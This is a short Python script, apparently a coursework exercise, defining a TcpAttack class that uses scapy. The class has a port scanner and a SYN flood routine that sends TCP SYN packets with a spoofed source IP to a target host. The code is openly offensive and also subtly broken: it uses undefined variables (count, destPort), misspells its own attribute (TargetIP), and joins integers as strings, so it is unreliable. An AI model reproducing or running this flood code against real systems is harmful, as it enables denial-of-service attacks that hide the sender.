#!/usr/bin/env python
import sys, socket
import re
import os.path
from scapy.all import *


class TcpAttack:

    def __init__(self, fakeip, targetip):
        self.fakeIP = fakeip
        self.targetIP = targetip

    def scanTarget(self, start_port, end_port):
        dst_host = self.targetIP 
        open_ports = []                                                           
        # Scan the ports in the specified range:
        for testport in range(start_port, end_port+1):                               
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               
            sock.settimeout(0.1)                                                     
            try:                                                                     
                sock.connect( (dst_host, testport) )                                 
                open_ports.append(testport)                                          
                sys.stdout.write("%s" % testport)                                    
                sys.stdout.flush()                                                   
            except:                                                                  
                sys.stdout.write(".")                                                
                sys.stdout.flush()                                                   
        s = "\n".join(open_ports)
        with open ("openports.txt", 'w') as MyFile:
            MyFile.write(s)
    def attackTarget(self, port):
        cant = 0
        for i in range(count):                                                       
            IP_header = IP(src = self.fakeIP, dst = self.TargetIP)                                
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     
            packet = IP_header / TCP_header                                          
            try:                                                                     
                send(packet)  
                cant = 1
            except Exception as e:                                                   
                print e 
        return cant

       
            
